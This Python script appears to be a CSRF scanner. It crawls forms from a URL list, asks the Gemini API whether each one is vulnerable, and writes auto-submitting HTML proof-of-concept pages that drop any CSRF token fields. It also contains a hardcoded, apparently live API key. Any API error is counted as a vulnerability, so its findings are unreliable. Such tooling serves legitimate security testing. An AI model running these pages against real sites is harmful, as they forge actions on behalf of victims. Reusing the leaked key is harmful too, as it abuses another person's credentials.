import os
import requests
import urllib.parse
import json
import time
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

# CSRF protection mechanisms to check for
CSRF_PROTECTIONS = [
    'csrf',
    'xsrf',
    'token',
    '_token',
    'authenticity_token',
    'csrf_token',
    'xsrf_token',
    'anti-csrf',
    'anti-xsrf',
    'request_token',
    'nonce',
]

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_from_file(file_path):
    """Extract URLs from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url:  # Make sure URL is not empty
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs to test.")
    return urls

def extract_forms(html_content, base_url):
    """Extract forms from HTML content."""
    forms = []
    soup = BeautifulSoup(html_content, 'html.parser')
    
    for form in soup.find_all('form'):
        form_data = {
            'action': form.get('action', ''),
            'method': form.get('method', 'get').lower(),
            'inputs': [],
            'has_csrf_token': False,
            'csrf_token_name': None,
            'csrf_token_value': None,
        }
        
        # Handle relative URLs in action
        if form_data['action'] and not form_data['action'].startswith(('http://', 'https://')):
            form_data['action'] = urllib.parse.urljoin(base_url, form_data['action'])
        elif not form_data['action']:
            form_data['action'] = base_url
        
        # Extract all input fields
        for input_field in form.find_all(['input', 'textarea', 'select']):
            input_type = input_field.get('type', '')
            input_name = input_field.get('name', '')
            input_value = input_field.get('value', '')
            
            if input_name:
                input_data = {
                    'name': input_name,
                    'type': input_type,
                    'value': input_value,
                }
                form_data['inputs'].append(input_data)
                
                # Check if this input might be a CSRF token
                if any(token in input_name.lower() for token in CSRF_PROTECTIONS):
                    form_data['has_csrf_token'] = True
                    form_data['csrf_token_name'] = input_name
                    form_data['csrf_token_value'] = input_value
        
        forms.append(form_data)
    
    return forms

def check_csrf_headers(headers):
    """Check if response headers contain CSRF protection."""
    headers_str = str(headers).lower()
    
    # Check for common CSRF headers
    csrf_headers = [
        'x-csrf-token',
        'x-xsrf-token',
        'csrf-token',
        'xsrf-token',
        'x-csrf-protection',
        'x-xsrf-protection',
    ]
    
    for header in csrf_headers:
        if header in headers_str:
            return True, header
    
    return False, None

def check_same_site_cookies(cookies):
    """Check if cookies have SameSite attribute set."""
    for cookie in cookies:
        cookie_str = str(cookie).lower()
        if 'samesite' not in cookie_str:
            return False
    
    return len(cookies) > 0

def analyze_with_gemini(url, form_data, has_csrf_token, csrf_header, same_site_cookies):
    """
    Use Gemini API to analyze if the form is vulnerable to CSRF.
    """
    # Prepare form data for Gemini
    form_inputs = ""
    for input_data in form_data['inputs']:
        form_inputs += f"- Name: {input_data['name']}, Type: {input_data['type']}, Value: {input_data['value']}\n"
    
    prompt = f"""
    I need to analyze if this form is vulnerable to Cross-Site Request Forgery (CSRF).
    
    URL: {url}
    Form Action: {form_data['action']}
    Form Method: {form_data['method']}
    
    Form Inputs:
    {form_inputs}
    
    CSRF Protection Analysis:
    - Has CSRF Token in Form: {has_csrf_token}
    - Has CSRF Header: {csrf_header[0]} (Header: {csrf_header[1] if csrf_header[0] else 'None'})
    - Has SameSite Cookies: {same_site_cookies}
    
    Please analyze if this form is vulnerable to CSRF based on:
    1. The presence or absence of CSRF tokens in the form
    2. The presence of CSRF protection headers
    3. The use of SameSite cookies
    4. The form method (POST forms without protection are more vulnerable)
    5. The sensitivity of the action (e.g., forms that change state or perform important actions)
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return True, "Error analyzing response with Gemini, assuming potentially vulnerable"
    except Exception as e:
        return True, f"Error calling Gemini API: {str(e)}, assuming potentially vulnerable"

def test_url_for_csrf(url):
    """Test a URL for CSRF vulnerabilities."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # Make the request
        session = requests.Session()
        response = session.get(url, headers=HEADERS, timeout=15)
        
        # Check if the request was successful
        if response.status_code != 200:
            print(f"Failed to fetch {url}: Status code {response.status_code}")
            return []
        
        # Check for CSRF protection in headers
        has_csrf_header, csrf_header_name = check_csrf_headers(response.headers)
        
        # Check for SameSite cookies
        has_same_site_cookies = check_same_site_cookies(session.cookies)
        
        # Extract forms from the page
        forms = extract_forms(response.text, url)
        
        if not forms:
            print(f"No forms found on {url}")
            return []
        
        print(f"Found {len(forms)} forms to test")
        
        # Test each form for CSRF vulnerabilities
        for i, form in enumerate(forms):
            print(f"Testing form #{i+1} with action: {form['action']}")
            
            # Skip forms with GET method as they're less likely to be vulnerable to CSRF
            if form['method'] == 'get':
                print(f"Form #{i+1} uses GET method, less likely to be vulnerable to CSRF")
                continue
            
            # Check if the form has a CSRF token
            has_csrf_token = form['has_csrf_token']
            
            # Use Gemini to analyze if the form is vulnerable to CSRF
            is_vulnerable, explanation = analyze_with_gemini(
                url, 
                form, 
                has_csrf_token, 
                (has_csrf_header, csrf_header_name), 
                has_same_site_cookies
            )
            
            if is_vulnerable:
                print(f"Potential CSRF vulnerability found in form #{i+1}")
                
                # Generate a CSRF PoC
                csrf_poc = generate_csrf_poc(form)
                
                results.append({
                    'url': url,
                    'form_action': form['action'],
                    'form_method': form['method'],
                    'has_csrf_token': has_csrf_token,
                    'has_csrf_header': has_csrf_header,
                    'has_same_site_cookies': has_same_site_cookies,
                    'status': 'Potential CSRF Vulnerability',
                    'analysis': explanation,
                    'csrf_poc': csrf_poc
                })
    
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def generate_csrf_poc(form):
    """Generate a CSRF Proof of Concept HTML form."""
    action = form['action']
    method = form['method']
    
    poc = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This form will automatically submit when the page loads:</p>
    <form id="csrf-form" action="{action}" method="{method}">
"""
    
    # Add all form inputs except CSRF tokens
    for input_data in form['inputs']:
        if not any(token in input_data['name'].lower() for token in CSRF_PROTECTIONS):
            poc += f'        <input type="hidden" name="{input_data["name"]}" value="{input_data["value"]}">\n'
    
    poc += """
    </form>
    <script>
        // Auto-submit the form when the page loads
        window.onload = function() {
            document.getElementById("csrf-form").submit();
        }
    </script>
</body>
</html>
"""
    
    return poc

def scan_csrf(urls_file_path, max_workers=3):
    """
    Scan URLs for CSRF vulnerabilities.
    
    Args:
        urls_file_path: Path to the file containing URLs
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential CSRF vulnerabilities
    """
    if not os.path.exists(urls_file_path):
        print(f"File not found: {urls_file_path}")
        return []
    
    urls = extract_urls_from_file(urls_file_path)
    if not urls:
        print("No URLs found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_csrf, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(urls_file_path)
    domain = os.path.basename(urls_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_csrf_results.txt")
    poc_dir = os.path.join(output_dir, f"{domain}_csrf_pocs")
    
    # Create directory for PoCs if it doesn't exist
    if all_results and not os.path.exists(poc_dir):
        os.makedirs(poc_dir)
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("CSRF Vulnerability Scan Results\n")
            f.write("===============================\n\n")
            
            for i, result in enumerate(all_results):
                f.write(f"Finding #{i+1}:\n")
                f.write(f"URL: {result['url']}\n")
                f.write(f"Form Action: {result['form_action']}\n")
                f.write(f"Form Method: {result['form_method']}\n")
                f.write(f"Has CSRF Token: {result['has_csrf_token']}\n")
                f.write(f"Has CSRF Header: {result['has_csrf_header']}\n")
                f.write(f"Has SameSite Cookies: {result['has_same_site_cookies']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                
                # Save PoC to a separate file
                poc_file = os.path.join(poc_dir, f"csrf_poc_{i+1}.html")
                with open(poc_file, 'w') as poc_f:
                    poc_f.write(result['csrf_poc'])
                
                f.write(f"CSRF PoC: {poc_file}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No CSRF vulnerabilities found.\n")
    
    return all_results

def test_specific_url(target_url):
    """Test a specific URL for CSRF vulnerabilities."""
    print(f"Testing URL: {target_url}")
    
    results = test_url_for_csrf(target_url)
    
    if results:
        print(f"\nFound {len(results)} potential CSRF vulnerabilities!")
        for i, result in enumerate(results):
            print(f"\nFinding #{i+1}:")
            print(f"URL: {result['url']}")
            print(f"Form Action: {result['form_action']}")
            print(f"Form Method: {result['form_method']}")
            print(f"Has CSRF Token: {result['has_csrf_token']}")
            print(f"Has CSRF Header: {result['has_csrf_header']}")
            print(f"Has SameSite Cookies: {result['has_same_site_cookies']}")
            print(f"Status: {result['status']}")
            print(f"Analysis: {result['analysis']}")
            
            # Save PoC to a file
            poc_file = f"csrf_poc_{i+1}.html"
            with open(poc_file, 'w') as f:
                f.write(result['csrf_poc'])
            
            print(f"CSRF PoC saved to: {poc_file}")
    else:
        print("\nNo CSRF vulnerabilities found.")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct URL test
        if file_path.startswith('http'):
            results = test_specific_url(file_path)
        else:
            print(f"Scanning file: {file_path}")
            results = scan_csrf(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential CSRF vulnerabilities!")
                for i, result in enumerate(results):
                    print(f"\nFinding #{i+1}:")
                    print(f"URL: {result['url']}")
                    print(f"Form Action: {result['form_action']}")
                    print(f"Form Method: {result['form_method']}")
                    print(f"Has CSRF Token: {result['has_csrf_token']}")
                    print(f"Has CSRF Header: {result['has_csrf_header']}")
                    print(f"Has SameSite Cookies: {result['has_same_site_cookies']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
                    print(f"CSRF PoC saved to: {os.path.join(os.path.dirname(file_path), os.path.basename(file_path).split('_')[0] + '_csrf_pocs', f'csrf_poc_{i+1}.html')}")
            else:
                print("\nNo CSRF vulnerabilities found.")
    else:
        print("Usage: python csrf_test.py <path_to_urls_file_or_direct_url>")
        print("Examples:")
        print("  python csrf_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_urls.txt")
        print("  python csrf_test.py http://example.com/login")